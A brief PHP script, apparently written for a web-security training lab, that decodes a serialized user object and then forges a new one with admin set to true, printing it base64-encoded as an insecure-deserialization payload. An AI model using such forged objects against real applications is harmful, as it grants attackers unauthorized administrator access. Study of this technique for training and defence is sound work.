<?php
$data= "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=";
$obj = unserialize(base64_decode($data));

var_dump($obj);

class User
{
	public $username;
	public $admin;
}

$attack= new User();
$attack->username="carlos";
$attack->admin =True;

echo base64_encode(serialize($attack));
